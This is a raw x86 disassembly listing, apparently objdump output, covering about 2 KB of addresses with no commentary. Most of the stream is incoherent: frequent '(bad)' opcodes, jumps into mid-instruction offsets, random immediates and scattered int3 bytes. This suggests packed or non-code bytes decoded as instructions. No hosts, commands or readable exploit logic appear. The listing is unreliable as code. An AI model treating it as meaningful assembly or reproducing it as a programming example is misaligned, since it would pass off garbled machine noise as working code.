  442ef6:	mov    esi,0x8383ffa9
  442efb:	inc    DWORD PTR [ebx+0x319983ef]
  442f01:	add    DWORD PTR [ebx-0x68eb5200],0xfffffffd
  442f08:	add    DWORD PTR [eax],0x0
  442f0b:	add    DWORD PTR [eax],0xc
  442f0e:	sbb    esp,DWORD PTR [edx+edi*2-0x21ff007d]
  442f15:	(bad)  
  442f16:	xchg   edi,eax
  442f17:	mov    ds:0xcccc00,eax
  442f1c:	jmp    ebp
  442f1e:	mov    ebx,ebp
  442f20:	stos   BYTE PTR es:[edi],al
  442f21:	(bad)  
  442f22:	inc    DWORD PTR [eax]
  442f24:	pop    ds
  442f25:	dec    ecx
  442f26:	pop    ds
  442f27:	jno    0x442ef5
  442f29:	(bad)  
  442f2a:	inc    DWORD PTR [eax]
  442f2c:	mov    DWORD PTR [esi+0x4e],edx
  442f2f:	(bad)
  442f32:	(bad)  
  442f33:	dec    DWORD PTR [ebx+0x33]
  442f36:	ja     0x442f9d
  442f38:	mov    edi,edi
  442f3a:	int3   
  442f3b:	inc    DWORD PTR [ebx+0x1bd092b8]
  442f41:	add    BYTE PTR [eax],al
  442f43:	call   edx
  442f45:	jecxz  0x442f1b
  442f47:	jo     0x442f48
  442f49:	add    BYTE PTR [eax],al
  442f4b:	add    DWORD PTR [eax],0x5d
  442f4e:	inc    ebp
  442f4f:	mov    eax,0xff0027
  442f54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442f55:	dec    edx
  442f56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  442f57:	int3   
  442f58:	inc    DWORD PTR [eax]
  442f5a:	inc    DWORD PTR [eax]
  442f5c:	(bad)  
  442f5d:	mov    edi,0xccd774dd
  442f62:	dec    DWORD PTR [ecx-0x22f591cf]
  442f68:	dec    DWORD PTR [ecx-0x62000001]
  442f6e:	inc    esi
  442f6f:	and    DWORD PTR [eax-0x2dff0100],edi
  442f75:	xchg   ecx,eax
  442f76:	mov    cl,0x6e
  442f78:	int3   
  442f79:	add    BYTE PTR [eax],al
  442f7b:	(bad)  
  442f7c:	call   DWORD PTR ds:0x2ec006
  442f82:	(bad)  
  442f83:	call   DWORD PTR [ecx]
  442f85:	cmp    DWORD PTR ds:0xffff836d,eax
  442f8b:	int3   
  442f8c:	add    BYTE PTR [ebp-0x6b7cf],ah
  442f92:	inc    DWORD PTR [ebx+0x46c5bae4]
  442f98:	add    BYTE PTR [eax],al
  442f9a:	add    BYTE PTR [ecx-0x695aa901],cl
  442fa0:	imul   eax,DWORD PTR [eax],0xffffffff
  442fa3:	(bad)  
  442fa4:	cmp    BYTE PTR [eax-0x6f6d],bl
  442faa:	add    BYTE PTR [eax],al
  442fac:	add    BYTE PTR [eax+0x3c],al
  442faf:	stc    
  442fb0:	arpl   WORD PTR [eax],ax
  442fb2:	mov    edi,edi
  442fb4:	imul   edi,esp,0x58
  442fb7:	mov    esi,0xffffff89
  442fbc:	mov    eax,edi
  442fbe:	cmp    DWORD PTR [esp+edi*8+0x1dffcc89],0xc24b32
  442fc9:	inc    DWORD PTR [ebx-0x6df20000]
  442fcf:	or     edx,ecx
  442fd1:	(bad)  
  442fd2:	(bad)  
  442fd3:	(bad)  
  442fd4:	mov    edx,0xff0c0712
  442fd9:	int3   
  442fda:	(bad)  
  442fdb:	inc    DWORD PTR [eax]
  442fdd:	les    edi,FWORD PTR [ebx+0xedca]
  442fe3:	mov    esp,esp
  442fe5:	cmc    
  442fe6:	call   0xff83:0xccffffd2
  442fed:	aas    
  442fee:	scas   al,BYTE PTR es:[edi]
  442fef:	xchg   esp,eax
  442ff0:	pop    ebp
  442ff1:	mov    DWORD PTR [ebx-0x34eaff01],eax
  442ff7:	add    bh,bh
  442ff9:	inc    DWORD PTR [eax]
  442ffb:	int3   
  442ffc:	or     DWORD PTR [ebp+0x20],0xffffffd2
  443000:	pop    ds
  443001:	(bad)  
  443002:	(bad)  
  443003:	dec    DWORD PTR [eax-0x7f]
  443006:	mul    BYTE PTR [eax-0x7c01]
  44300c:	adc    DWORD PTR [esi+0x66],0xffffffe0
  443010:	stos   BYTE PTR es:[edi],al
  443011:	inc    DWORD PTR [eax]
  443013:	mov    DWORD PTR [edx],edx
  443015:	retf   0xdcb2
  443018:	(bad)  
  443019:	inc    DWORD PTR [eax]
  44301b:	(bad)  
  44301c:	(bad)  
  44301d:	jmp    0x67bec3
  443022:	add    BYTE PTR [ecx-0x27073985],cl
  443028:	add    ah,cl
  44302a:	add    DWORD PTR [eax],0xffffffff
  44302d:	dec    esp
  44302e:	inc    ebx
  44302f:	ret    
  443030:	push   cs
  443031:	add    bh,bh
  443033:	jmp    DWORD PTR [edx-0x80]
  443036:	je     0x44306a
  443038:	int3   
  443039:	(bad)  
  44303a:	inc    DWORD PTR [ebx+0x667254ff]
  443040:	out    0x83,eax
  443042:	add    BYTE PTR [eax],al
  443044:	push   0xffffac5b
  443049:	add    bh,bh
  44304b:	(bad)  
  44304c:	(bad)  
  44304d:	inc    DWORD PTR [eax]
  44304f:	jmp    ebp
  443051:	int3   
  443052:	inc    DWORD PTR [eax]
  443054:	dec    DWORD PTR [ecx+0x46b7b726]
  44305a:	add    BYTE PTR [eax],al
  44305c:	add    bh,bh
  44305e:	push   0xffffffbf
  443060:	out    0xf6,eax
  443062:	add    bh,bh
  443064:	(bad)  
  443065:	dec    DWORD PTR [esi]
  443067:	(bad)  
  443068:	jmp    0x4430c0
  44306a:	(bad)  
  44306b:	(bad)  
  44306c:	(bad)  
  44306d:	jmp    ecx
  44306f:	xor    eax,0xffffc11e
  443074:	add    BYTE PTR [eax],al
  443076:	inc    ebx
  443077:	mov    cs:0x83ffffae,eax
  44307d:	add    BYTE PTR [edi+0xe4f044],bh
  443083:	dec    esp
  443085:	add    BYTE PTR [ebp-0x76a2e35c],ch
  44308b:	inc    DWORD PTR [eax]
  44308d:	add    BYTE PTR [ecx],ah
  44308f:	mov    ch,0x5
  443091:	dec    ebx
  443092:	(bad)  
  443093:	(bad)  
  443094:	(bad)  
  443095:	jmp    DWORD PTR [eax+0xbd4594]
  44309b:	cmp    edi,0xffffff89
  44309e:	adc    dl,ch
  4430a0:	retf   
  4430a1:	mov    cl,0xcc
  4430a3:	int3   
  4430a4:	add    BYTE PTR [eax],al
  4430a6:	in     eax,dx
  4430a7:	mov    dl,0x19
  4430a9:	scas   eax,DWORD PTR es:[edi]
  4430aa:	mov    edi,edi
  4430ac:	inc    DWORD PTR [eax]
  4430ae:	(bad)  
  4430af:	adc    ecx,ebp
  4430b1:	adc    al,0x0
  4430b3:	int3   
  4430b4:	inc    DWORD PTR [ebx+0x488d8554]
  4430ba:	inc    DWORD PTR [eax]
  4430bc:	dec    DWORD PTR [ecx-0x2b2b137]
  4430c2:	add    BYTE PTR [eax],al
  4430c4:	inc    DWORD PTR [eax]
  4430c6:	dec    ebx
  4430c7:	retf   0xebbc
  4430ca:	(bad)  
  4430cb:	(bad)  
  4430cc:	(bad)  
  4430cd:	dec    DWORD PTR [ebp+0x38]
  4430d0:	cmp    dh,BYTE PTR [ebp+0x0]
  4430d3:	(bad)  
  4430d4:	(bad)  
  4430d5:	dec    edi
  4430d7:	and    cl,BYTE PTR [ebp-0x4f]
  4430dd:	inc    DWORD PTR [ecx-0x7c]
  4430e0:	push   edi
  4430e1:	dec    edi
  4430e2:	(bad)  
  4430e3:	dec    esp
  4430e5:	adc    DWORD PTR [edi+eax*4-0x34],0xffffffcc
  4430ea:	int3   
  4430eb:	int3   
  4430ec:	int3   
  4430ed:	int3   
  4430ee:	int3   
  4430ef:	int3   
  4430f0:	push   DWORD PTR [edx]
  4430f2:	and    esp,ecx
  4430f4:	mov    ebx,0xffffce83
  4430f9:	sub    al,0x46
  4430fb:	(bad)  
  4430fc:	mov    eax,0xffff3689
  443101:	ret    
  443102:	xchg   esp,eax
  443103:	call   FWORD PTR [esi-0x34]
  443106:	jb     0x443107
  443108:	sbb    esi,0x58
  44310b:	mov    ecx,eax
  44310d:	(bad)  
  44310e:	cmp    al,BYTE PTR [eax]
  443110:	call   DWORD PTR [esi-0x338600cc]
  443116:	cmp    bh,0x0
  443119:	push   cs
  44311a:	in     al,dx
  44311b:	(bad)  
  44311c:	fcmovne st,st(4)
  44311e:	add    al,0xff
  443120:	add    cl,cl
  443122:	xor    bx,0xffff
  443126:	cmp    al,0x0
  443128:	add    BYTE PTR [eax+ecx*2],bh
  44312b:	sbb    DWORD PTR [eax+eax*1+0x3cffff9e],0xffffffe2
  443133:	add    BYTE PTR [ebp-0x34],ah
  443136:	adc    edi,edi
  443138:	add    dh,dl
  44313a:	lods   al,BYTE PTR ds:[esi]
  44313b:	xor    DWORD PTR [edx-0x7c00e400],0x5d
  443142:	inc    ebp
  443143:	add    BYTE PTR [eax-0x1],dh
  443146:	dec    esi
  443147:	cmp    edi,0xffffffe2
  44314a:	push   es
  44314b:	add    BYTE PTR [edx],al
  44314d:	(bad)  
  44314e:	(bad)  
  44314f:	(bad)  
  443150:	dec    DWORD PTR [esi]
  443152:	jl     0x443153
  443154:	add    eax,0xff003a00
  443159:	ins    DWORD PTR es:[edi],dx
  44315a:	mov    ebp,0xc1ff5283
  44315f:	add    bh,bh
  443161:	(bad)  
  443162:	hlt    
  443163:	add    BYTE PTR [ebx],bl
  443165:	call   FWORD PTR [edi]
  443167:	cmp    edi,0xfffffffe
  44316a:	mov    edi,edi
  44316c:	out    dx,eax
  44316d:	dec    DWORD PTR [esi]
  44316f:	inc    DWORD PTR [eax]
  443171:	push   esi
  443172:	mov    ?,edi
  443174:	pushf  
  443175:	int3   
  443176:	pop    edx
  443177:	add    bh,bh
  443179:	in     eax,0xbc
  44317b:	and    ebp,0xffffff83
  44317e:	mov    al,ds:0xf3b50000
  443183:	mov    DWORD PTR [edi-0xa701],esi
  443189:	xchg   ebx,eax
  44318a:	outs   dx,BYTE PTR ds:[esi]
  44318b:	sbb    DWORD PTR [edi],0xffffffff
  44318e:	in     al,0x83
  443190:	(bad)  
  443191:	jge    0x4431c9
  443193:	mov    DWORD PTR [eax-0x33ffdb00],edi
  443199:	xor    BYTE PTR [edx-0x1],cl
  44319c:	inc    ebx
  44319d:	add    BYTE PTR [ebp-0x7d],bl
  4431a0:	add    BYTE PTR [esi-0x5f],dh
  4431a3:	call   FWORD PTR [esi]
  4431a5:	add    DWORD PTR [ebx],0xffffffcc
  4431a8:	add    BYTE PTR [ebx],dl
  4431aa:	xchg   edi,eax
  4431ab:	inc    DWORD PTR [esi+0x0]
  4431ae:	mov    cl,BYTE PTR [ecx-0x6c7800]
  4431b4:	ja     0x4431b5
  4431b6:	(bad)  
  4431b7:	dec    esp
  4431b9:	sub    eax,0x18ccbe
  4431be:	popa   
  4431bf:	add    ah,cl
  4431c1:	xchg   ebx,eax
  4431c2:	xor    bh,bh
  4431c4:	(bad)  
  4431c5:	int3   
  4431c6:	mov    ecx,0x8f2f0000
  4431cb:	int3   
  4431cc:	adc    al,0xff
  4431ce:	push   ecx
  4431cf:	dec    esp
  4431d1:	cmp    DWORD PTR [ebx-0x7d],esi
  4431d4:	sar    edi,0x75
  4431d7:	add    BYTE PTR [eax],al
  4431d9:	sub    ebp,ebp
  4431db:	int3   
  4431dc:	cld    
  4431dd:	or     eax,0xffffffff
  4431e0:	add    BYTE PTR [edi+0x76],cl
  4431e3:	int3   
  4431e4:	mov    ebp,0xff0093cc
  4431e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4431ea:	xchg   edx,eax
  4431eb:	add    ecx,0x0
  4431ee:	mov    cl,0xff
  4431f0:	call   edi
  4431f2:	cmp    ah,cl
  4431f4:	push   eax
  4431f5:	jmp    FWORD PTR [eax+eax*1-0x1]
  4431f9:	rol    DWORD PTR [edi+edi*8],1
  4431fc:	push   0xa600
  443201:	outs   dx,BYTE PTR ds:[esi]
  443202:	cmp    al,BYTE PTR [ebx-0xbaff02]
  443208:	xor    DWORD PTR [eax],0x5e
  44320b:	(bad)  
  44320c:	in     eax,dx
  44320d:	call   DWORD PTR [edi+edi*8]
  443210:	int3   
  443211:	dec    edi
  443212:	sbb    al,0x83
  443214:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  443215:	push   edx
  443217:	add    bh,bh
  443219:	jg     0x4431fa
  44321b:	add    DWORD PTR [edx],0x0
  44321e:	or     al,0x0
  443220:	(bad)  
  443221:	fistp  DWORD PTR [eax-0x3c7cdd01]
  443227:	add    BYTE PTR [ecx+0x50003e8],cl
  44322d:	add    BYTE PTR [edx+0x5047ff89],dl
  443233:	dec    DWORD PTR [edi]
  443235:	push   DWORD PTR [eax-0x1]
  443238:	jmp    FWORD PTR [esi+0xacffb4]
  44323e:	jmp    0x3783:0x5ecfccff
  443245:	(bad)  
  443246:	jp     0x443248
  443248:	inc    DWORD PTR [eax-0x76]
  44324b:	int3   
  44324c:	and    DWORD PTR [eax],eax
  44324e:	adc    eax,0xc38c83ff
  443253:	int3   
  443254:	sbb    al,0xff
  443256:	jg     0x443257
  443258:	add    BYTE PTR [ebx-0x24],al
  44325b:	add    BYTE PTR [eax+eax*1+0x36ff8308],al
  443262:	sbb    ah,cl
  443264:	js     0x443265
  443266:	nop
  443267:	int3   
  443268:	add    BYTE PTR [ecx+0x3e],bl
  44326b:	add    dh,bl
  44326d:	add    BYTE PTR [eax-0x58f70000],bh
  443273:	jmp    DWORD PTR [ebp-0x1]
  443276:	mov    eax,0x87230000
  44327b:	int3   
  44327c:	or     edi,edi
  44327e:	sti    
  44327f:	(bad)  
  443280:	dec    DWORD PTR [ebx-0x8d00f0]
  443286:	retf   
  443287:	add    BYTE PTR [ebx-0x3a76b968],al
  44328d:	add    BYTE PTR [ebp+0x0],cl
  443290:	inc    DWORD PTR [ecx]
  443292:	data16 add BYTE PTR [esi],bh
  443295:	add    BYTE PTR [ebp-0x45933400],dh
  44329b:	add    BYTE PTR [edx],dh
  44329d:	mov    DWORD PTR ds:0xc26b0000,ebx
  4432a3:	push   DWORD PTR [edi]
  4432a5:	mov    DWORD PTR [eax-0x1],esp
  4432a8:	int3   
  4432a9:	jecxz  0x44326b
  4432ab:	jmp    eax
  4432ad:	adc    DWORD PTR [ebp-0x7d],0x0
  4432b1:	fst    QWORD PTR [edi-0x1]
  4432b4:	pushf  
  4432b5:	push   DWORD PTR [ebx-0x1]
  4432b8:	cmp    DWORD PTR [edx-0x33b6761a],0x1d
  4432bf:	inc    DWORD PTR [eax]
  4432c1:	and    ebx,DWORD PTR ds:0x92892c00
  4432c7:	inc    DWORD PTR [ebx-0x2f335eb5]
  4432cd:	add    al,ah
  4432cf:	int3   
  4432d0:	(bad)  
  4432d1:	clc    
  4432d2:	scas   al,BYTE PTR es:[edi]
  4432d3:	int3   
  4432d4:	cmp    bh,0xcd
  4432d7:	inc    DWORD PTR [eax]
  4432d9:	xchg   ebp,eax
  4432da:	mov    ah,0x0
  4432dc:	push   esp
  4432dd:	call   DWORD PTR [edi]
  4432df:	(bad)  
  4432e0:	push   DWORD PTR [eax-0x5afff4]
  4432e6:	sub    DWORD PTR [eax],eax
  4432e8:	jmp    FWORD PTR [edx]
  4432ea:	cmp    edi,0xffc4ffc7
  4432f0:	and    DWORD PTR [ecx],0x13
  4432f3:	dec    DWORD PTR [edx+0x6200]
  4432f9:	add    BYTE PTR [ebp-0x24008034],dh
  4432ff:	(bad)  
  443300:	(bad)  
  443301:	(bad)  [ebp-0x1]
  443304:	in     al,0xff
  443306:	xor    al,0x0
  443308:	inc    DWORD PTR [eax-0xa]
  44330b:	add    BYTE PTR [ebx-0x1],ah
  44330e:	sar    bh,1
  443310:	add    BYTE PTR [edx+0xc300da],ah
  443316:	adc    eax,0x3cd00ff
  44331b:	mov    ebx,edx
  44331d:	mov    DWORD PTR [eax+0x122effff],eax
  443323:	push   DWORD PTR [ebx-0x76ff0201]
  443329:	test   al,0x3b
  44332b:	mov    edi,esi
  44332d:	add    BYTE PTR [ecx-0x7825ff7d],dh
  443333:	mov    esp,edi
  443335:	jmp    DWORD PTR [eax-0x34]
  443338:	call   DWORD PTR ds:0xfff1ff69
  44333e:	stc    
  44333f:	(bad)  
  443340:	inc    DWORD PTR [esi]
  443342:	xor    al,0x0
  443344:	ret    
  443345:	mov    DWORD PTR [esi+0x54ee00ff],ebx
  44334b:	push   DWORD PTR [edi-0x33001f77]
  443351:	scas   eax,DWORD PTR es:[edi]
  443352:	mov    dl,0xff
  443354:	sub    eax,0x83ff3fff
  443359:	popa   
  44335a:	aaa    
  44335b:	dec    esi
  44335d:	add    BYTE PTR [edi],al
  44335f:	add    bh,bh
  443361:	cli    
  443362:	retf   0x2f00
  443365:	and    DWORD PTR [ecx-0x7d],0xffffffff
  443369:	pushf  
  44336a:	retf   0x9783
  44336d:	add    BYTE PTR [edi+edi*8-0x1],ah
  443371:	and    bh,dh
  443373:	inc    DWORD PTR [ebx]
  443375:	xor    DWORD PTR [eax-0x1b120000],0xffffff83
  44337c:	aaa    
  44337d:	add    BYTE PTR [ecx-0x1],al
  443380:	int3   
  443381:	sar    dh,cl
  443383:	adc    DWORD PTR [ecx-0x7cffb27d],0xffffffde
  44338a:	push   ss
  44338b:	add    bh,ah
  44338d:	(bad)  
  44338e:	jmp    0x2328335f
  443393:	push   DWORD PTR [edi+edi*8+0x35]
  443397:	inc    DWORD PTR [ebx+0x30071b9]
  44339d:	jmp    DWORD PTR [ecx]
  44339f:	(bad)  
  4433a0:	(bad)  
  4433a1:	clc    
  4433a2:	add    edi,edi
  4433a4:	adc    cl,BYTE PTR [ecx-0x6cff00b9]
  4433aa:	ins    DWORD PTR es:[edi],dx
  4433ab:	or     DWORD PTR ds:0x89ff6e00,0x0
  4433b2:	in     al,dx
  4433b3:	add    BYTE PTR [eax-0x34],bl
  4433b6:	or     DWORD PTR [ebx-0x765ab601],eax
  4433bc:	push   esi
  4433bd:	push   DWORD PTR [edi+edi*8-0x7d]
  4433c1:	imul   DWORD PTR [eax+eax*1-0x3f76aa]
  4433c8:	(bad)  
  4433c9:	aas    
  4433ca:	cmp    bh,0xbe
  4433cd:	cmp    esi,0xffffffff
  4433d0:	int3   
  4433d1:	xor    dl,BYTE PTR [eax]
  4433d3:	or     DWORD PTR [edx-0x1],0xfffffff2
  4433d7:	add    BYTE PTR [ecx-0x7400e45c],cl
  4433dd:	call   DWORD PTR [edx+0x0]
  4433e0:	add    BYTE PTR [edx+0x61],cl
  4433e3:	jmp    DWORD PTR [ebx-0x7c009501]
  4433e9:	xor    esi,DWORD PTR [esp+ecx*8]
  4433ec:	sbb    al,0xff
  4433ee:	cdq    
  4433ef:	int3   
  4433f0:	and    DWORD PTR [esi],0x10
  4433f3:	cmp    DWORD PTR [ebp+0xcce583],0x22
  4433fa:	jmp    0x9b438bff
  4433ff:	(bad)  
  443400:	jmp    eax
  443402:	mov    cl,0x0
  443404:	push   ss
  443405:	inc    DWORD PTR [eax]
  443407:	inc    DWORD PTR [eax]
  443409:	inc    eax
  44340a:	jmp    0xe310e50e
  44340f:	add    BYTE PTR [eax],al
  443411:	jo     0x44347a
  443413:	inc    edx
  443415:	call   DWORD PTR [eax-0x1]
  443418:	push   edi
  44341a:	inc    esi
  44341b:	dec    DWORD PTR [edi+edi*8+0x3d00ffb3]
  443422:	(bad)  
  443424:	xor    bh,bh
  443426:	mov    al,0xcc
  443428:	mov    DWORD PTR [ecx-0x420034],edi
  44342e:	(bad)  
  44342f:	inc    DWORD PTR [eax]
  443431:	xchg   ecx,eax
  443432:	inc    ebp
  443433:	dec    DWORD PTR [eax+0x89f7ff]
  443439:	jmp    0x4433e6
  44343b:	jmp    FWORD PTR [eax-0x3300377d]
  443441:	dec    ebp
  443442:	jnp    0x443443
  443444:	jp     0x443445
  443446:	outs   dx,BYTE PTR ds:[esi]
  443447:	add    ah,cl
  443449:	and    bh,al
  44344b:	add    BYTE PTR [edx-0x200],dl
  443451:	out    dx,al
  443452:	lods   eax,DWORD PTR ds:[esi]
  443453:	add    BYTE PTR [eax+0x0],bl
  443456:	ss mov edi,edi
  443459:	inc    edx
  44345a:	xchg   ecx,eax
  44345b:	dec    DWORD PTR [edi]
  44345d:	int3   
  44345e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44345f:	dec    esp
  443461:	pop    ebp
  443462:	sbb    WORD PTR [ecx+0xcaff],0xffe8
  44346a:	rol    DWORD PTR [ebx-0x7cce3371],cl
  443470:	mov    edi,edi
  443472:	dec    ebp
  443473:	add    bl,ah
  443475:	add    BYTE PTR [esi],ch
  443477:	add    bh,bh
  443479:	ins    DWORD PTR es:[edi],dx
  44347a:	retf   
  44347b:	add    cl,bh
  44347d:	or     DWORD PTR [esi],0xffffffff
  443480:	(bad)  
  443481:	fist   WORD PTR [esi+0x0]
  443484:	sbb    al,0x83
  443486:	scas   al,BYTE PTR es:[edi]
  443487:	dec    DWORD PTR [ecx+0x4283f10b]
  44348d:	push   DWORD PTR [edi-0x515e7c7d]
  443493:	add    BYTE PTR [edx-0x7d],cl
  443496:	cmp    al,BYTE PTR [ebx-0xf9b277]
  44349c:	sub    al,0xff
  44349e:	pop    ss
  44349f:	add    DWORD PTR [eax],0x74
  4434a2:	mov    ds:0xe4831a00,eax
  4434a7:	int3   
  4434a8:	push   DWORD PTR ds:0xff1500fc
  4434ae:	fild   DWORD PTR [eax]
  4434b0:	int3   
  4434b1:	jge    0x4434ff
  4434b3:	inc    ecx
  4434b5:	int3   
  4434b6:	(bad)  
  4434b7:	int3   
  4434b8:	jmp    DWORD PTR [esi-0x35]
  4434bb:	int3   
  4434bc:	(bad)  
  4434be:	pushf  
  4434bf:	add    bh,bh
  4434c1:	pop    edi
  4434c2:	out    0xff,al
  4434c4:	mov    al,BYTE PTR [eax]
  4434c6:	pop    ebx
  4434c7:	dec    esp
  4434c9:	int    0xac
  4434cb:	add    dh,cl
  4434cd:	xor    DWORD PTR [ebx+0x6bf983ff],0xffffff83
  4434d4:	cld    
  4434d5:	add    BYTE PTR [edx-0x1],dl
  4434d8:	add    BYTE PTR [ecx-0x3319ff6d],dl
  4434de:	push   esp
  4434df:	add    bh,bh
  4434e1:	hlt    
  4434e2:	sbb    BYTE PTR [ebx+0xa489a2],al
  4434e8:	add    BYTE PTR [edi+ecx*8-0x34],dl
  4434ec:	dec    DWORD PTR ds:0x856300ff
  4434f3:	call   DWORD PTR [esi-0x7ca401]
  4434f9:	rcl    DWORD PTR [ebp+0x6a89a1ff],0x0
  443500:	push   DWORD PTR [esi]
  443502:	aam    0xff
  443504:	inc    ecx
  443505:	jmp    FWORD PTR [edi+0x0]
  443508:	jmp    DWORD PTR [edx+0xc]
  44350b:	xor    esp,0xffffffff
  44350e:	add    DWORD PTR [ecx-0x336b4c7d],ecx
  443514:	jmp    0x44349f
  443516:	data16 (bad) 
  443518:	dec    DWORD PTR [edi-0xab00ef]
  44351e:	dec    edx
  44351f:	(bad)  
  443520:	call   FWORD PTR [edx-0x76030028]
  443526:	retf   0xff
  443529:	int3   
  44352a:	ins    DWORD PTR es:[edi],dx
  44352b:	call   DWORD PTR [edi+0x0]
  44352e:	pop    ebx
  44352f:	add    DWORD PTR [eax],0x41
  443532:	cmc    
  443533:	and    DWORD PTR [esi-0x33fe00],0xffffffe7
  44353a:	inc    ecx
  44353b:	add    bl,dh
  44353d:	call   FWORD PTR [edx-0x1]
  443540:	mov    DWORD PTR [edi],ebx
  443542:	cmp    bh,bh
  443544:	and    edi,edi
  443546:	idiv   edi
  443548:	inc    DWORD PTR [ecx+0x4f]
  44354b:	add    BYTE PTR [ebx-0x1],ch
  44354e:	pop    ss
  44354f:	(bad)  
  443550:	jmp    FWORD PTR [ebx-0x533376]
  443556:	push   0x373fffff
  44355b:	int3   
  44355c:	jle    0x44355d
  44355e:	daa    
  44355f:	dec    esp
  443561:	ins    BYTE PTR es:[edi],dx
  443562:	xchg   BYTE PTR [eax],al
  443564:	mov    DWORD PTR [ebx-0xa33ffbb],eax
  44356a:	(bad)  
  44356b:	(bad)  
  44356c:	fadd   DWORD PTR [eax]
  44356e:	(bad)  
  44356f:	inc    DWORD PTR [ebx+0x2f898f89]
  443575:	(bad)  
  443576:	jl     0x443578
  443578:	jmp    FWORD PTR [esi]
  44357a:	xor    BYTE PTR [ebx-0xc5ff08],al
  443580:	mov    DWORD PTR [esi],eax
  443582:	mov    edi,0x35005700
  443587:	mov    DWORD PTR [eax],eax
  443589:	xor    eax,ecx
  44358b:	int3   
  44358c:	jae    0x44358e
  44358e:	xchg   esi,eax
  44358f:	add    BYTE PTR [ebx+0x2bffae9b],al
  443595:	or     DWORD PTR [ecx+0x0],0xffffff83
  443599:	lods   al,BYTE PTR ds:[esi]
  44359a:	dec    DWORD PTR fs:[ecx]
  44359d:	mov    DWORD PTR [edi],edx
  44359f:	int3   
  4435a0:	add    BYTE PTR [edx+ecx*8+0x62ff52ff],cl
  4435a7:	(bad)  
  4435a8:	inc    DWORD PTR [eax]
  4435aa:	pop    ds
  4435ab:	mov    DWORD PTR [edi-0x7c76e67d],edx
  4435b1:	js     0x443572
  4435b3:	add    BYTE PTR [edi-0xffec77],al
  4435b9:	push   0xffffffa3
  4435bb:	dec    esi
  4435bd:	int3   
  4435be:	sldt   WORD PTR [eax]
  4435c1:	retf   0xffc2
  4435c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4435c5:	int3   
  4435c6:	mov    DWORD PTR [eax],0xff4ed1cc
  4435cc:	sahf   
  4435cd:	int3   
  4435ce:	repnz (bad) 
  4435d0:	dec    eax
  4435d2:	icebp  
  4435d3:	add    BYTE PTR ds:0xff0031ff,dh
  4435d9:	mov    ds:0x4400c8,al
  4435de:	fdivp  st(7),st
  4435e0:	add    BYTE PTR [ebp+0x27],dl
  4435e3:	call   esp
  4435e5:	mov    DWORD PTR ds:0x975f00ff,esi
  4435eb:	push   DWORD PTR [edx-0x7500]
  4435f1:	or     esp,DWORD PTR [ecx-0x34]
  4435f4:	cmp    ah,cl
  4435f6:	xor    edi,edi
  4435f8:	jmp    DWORD PTR [esi]
  4435fa:	leave  
  4435fb:	mov    DWORD PTR [esi-0x7cff6e00],esi
  443601:	and    BYTE PTR [edi+edi*8-0x21],bh
  443605:	call   FWORD PTR [eax]
  443607:	add    bh,bh
  443609:	imul   ebp,DWORD PTR [eax],0xffffffff
  44360c:	aad    0xff
  44360e:	test   eax,0x1aa6cc00
  443613:	add    ch,bl
  443615:	push   ecx
  443617:	inc    DWORD PTR [ebx+0x42ff3018]
  44361d:	add    ah,ah
  44361f:	add    BYTE PTR [eax],al
  443621:	rol    bh,cl
  443623:	cmp    esp,0xffffffff
  443626:	mov    cl,0x83
  443628:	add    BYTE PTR [edx+ecx*2+0x32ff4eff],bh
  44362f:	(bad)  
  443630:	push   ecx
  443632:	mov    eax,ds:0xa800e783
  443637:	(bad)  
  443638:	jmp    DWORD PTR [edx]
  44363a:	jle    0x44363c
  44363c:	push   es
  44363d:	int3   
  44363e:	out    dx,al
  44363f:	add    bh,bh
  443641:	push   edx
  443642:	retf   0x55cc
  443645:	add    BYTE PTR [ecx-0x447e0001],bh
  44364b:	add    BYTE PTR [edi-0xff6334],al
  443651:	mov    dl,0x92
  443653:	add    dl,al
  443655:	add    BYTE PTR [eax],cl
  443657:	add    bh,bh
  443659:	popf   
  44365a:	sar    edi,1
  44365c:	xchg   edi,eax
  44365d:	add    BYTE PTR [esi],cl
  44365f:	dec    esp
  443661:	mov    eax,ds:0xdeffa2
  443666:	fwait
  443667:	add    bh,bh
  443669:	xchg   edx,ecx
  44366b:	(bad)  
  44366c:	(bad)  
  44366e:	inc    eax
  44366f:	int3   
  443670:	xor    DWORD PTR [esi-0x1e],0xffffffff
  443674:	or     eax,DWORD PTR [eax]
  443676:	jl     0x443601
  443678:	add    ah,bl
  44367a:	loopne 0x44367b
  44367c:	jo     0x44367d
  44367e:	pop    ebp
  44367f:	(bad)  
  443680:	(bad)  
  443681:	mov    ebx,0x8962ff3f
  443686:	test   DWORD PTR [ecx-0xba5b00],ecx
  44368c:	add    BYTE PTR ss:[edx+0x46c289ff],cl
  443693:	(bad)  
  443694:	cmp    eax,0x83894d00
  443699:	shr    DWORD PTR [ebx+0x42898fcc],0xff
  4436a0:	dec    DWORD PTR [eax-0x23]
  4436a3:	add    BYTE PTR [ebp-0x1],al
  4436a6:	mov    al,0x83
  4436a8:	int3   
  4436a9:	sbb    bh,0x0
  4436ac:	lods   al,BYTE PTR ds:[esi]
  4436ad:	(bad)  
  4436ae:	cmp    eax,DWORD PTR [ebx-0x7c89c700]
  4436b4:	clc    
  4436b5:	(bad)  
  4436b6:	sti    
  4436b7:	inc    DWORD PTR [eax]
  4436b9:	inc    ebx
  4436ba:	dec    esp
  4436bb:	inc    DWORD PTR [edi]
  4436bd:	jmp    DWORD PTR [esi+0x21dfff83]
  4436c3:	add    BYTE PTR [eax+0xff7600],ch
  4436c9:	pop    ds
  4436ca:	repnz add BYTE PTR [ebx+eax*4],ah
  4436ce:	and    al,0xff
  4436d0:	call   FWORD PTR [eax+0x2d]
  4436d3:	add    BYTE PTR [ecx-0x77],ch
  4436d6:	scas   eax,DWORD PTR es:[edi]
  4436d7:	inc    DWORD PTR [eax]
  4436d9:	lods   al,BYTE PTR ds:[esi]
  4436da:	dec    ecx
  4436db:	jmp    DWORD PTR [ecx-0x7c7c6d34]
  4436e1:	jmp    0x4436b6
  4436e3:	int3   
  4436e4:	push   ebp
  4436e5:	call   eax
  4436e7:	(bad)  
  4436e8:	push   edi
  4436ea:	inc    eax
  4436eb:	add    BYTE PTR [ecx+ecx*4+0x58ff0038],bh
  4436f2:	jecxz  0x4436f4
  4436f4:	test   BYTE PTR [eax],0xe6
  4436f7:	(bad)  
